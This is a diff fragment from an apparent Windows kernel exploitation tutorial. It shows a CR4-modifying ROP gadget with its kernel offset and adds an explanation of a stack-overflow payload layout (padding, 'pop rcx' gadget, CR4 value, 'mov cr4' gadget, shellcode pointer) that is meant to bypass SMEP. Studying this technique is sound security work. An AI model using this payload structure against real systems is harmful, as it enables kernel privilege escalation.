@@ -180,3 +180,11 @@ fffff800`1105142c 480fbaf112      btr     rcx,12h
 fffff800`11051431 0f22e1          mov     cr4,rcx // Gadget at offset from nt: +0x3D6431
 fffff800`11051434 c3              ret
 ```
+
+So with these two gadgets locations known to us, as in, we know their offsets relative to the kernel base, we can now implement them in our code. So to be clear, our payload that we'll be sending will look like this when we overwrite the stack: 
++ 'A' characters * 2056
++ our `pop rcx` gadget
++ The value we want `rcx` to hold
++ our `mov cr4, rcx` gadget
++ pointer to our shellcode.
+
